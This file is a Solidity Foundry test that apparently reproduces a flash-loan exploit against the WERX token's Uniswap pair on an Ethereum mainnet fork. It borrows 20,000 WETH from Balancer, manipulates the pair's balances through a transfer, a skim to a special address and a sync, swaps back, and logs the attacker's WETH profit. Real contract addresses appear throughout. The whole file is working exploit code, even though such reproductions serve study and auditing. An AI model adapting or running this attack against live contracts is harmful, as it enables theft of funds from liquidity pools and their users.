// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "./WERX.sol";

contract ContractTest is Test {
    IBalancerVault public vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IUniswapV2Router02 public router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Pair public pair = IUniswapV2Pair(0xa41529982BcCCDfA1105C6f08024DF787CA758C4);
    IERC20 public weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uwerx public werx = Uwerx(0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54);

    address public uniswapPoolAddress = 0x0000000000000000000000000000000000000001;

    function setUp() public {
        uint256 forkId = vm.createFork("mainnet", 17826202);
        vm.selectFork(forkId);
    }

    function testExp() public {
        weth.approve(address(router), type(uint256).max);
        werx.approve(address(router), type(uint256).max);


        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = weth;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 20000000000000000000000;

        vault.flashLoan(IFlashLoanRecipient(address(this)), tokens, amounts, bytes("0x"));
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        pair.sync();

        address[] memory tokenList = new address[](2);
        tokenList[0] = address(weth);
        tokenList[1] = address(werx);
        console.log(
            "pair balance before swap: weth - %s werx - %s",
            weth.balanceOf(address(pair)),
            werx.balanceOf(address(pair))
        );

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            20000000000000000000000,
            0,
            tokenList,
            address(this),
            1690965899
        );

        console.log(
            "pair balance after swap: weth - %s werx - %s",
            weth.balanceOf(address(pair)),
            werx.balanceOf(address(pair))
        );

        werx.transfer(address(pair), 4429817738575912760684500);

        console.log(
            "pair balance before skim: weth - %s werx - %s",
            weth.balanceOf(address(pair)),
            werx.balanceOf(address(pair))
        );

        pair.skim(uniswapPoolAddress);

        console.log(
            "pair balance after skim: weth - %s werx - %s",
            weth.balanceOf(address(pair)),
            werx.balanceOf(address(pair))
        );

        pair.sync();

        tokenList[0] = address(werx);
        tokenList[1] = address(weth);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            werx.balanceOf(address(this)),
            0,
            tokenList,
            address(this),
            1690965899
        );

        weth.transfer(address(vault), 20000000000000000000000);

        console.log("Attacker weth balance: %s", weth.balanceOf(address(this)));


    }
}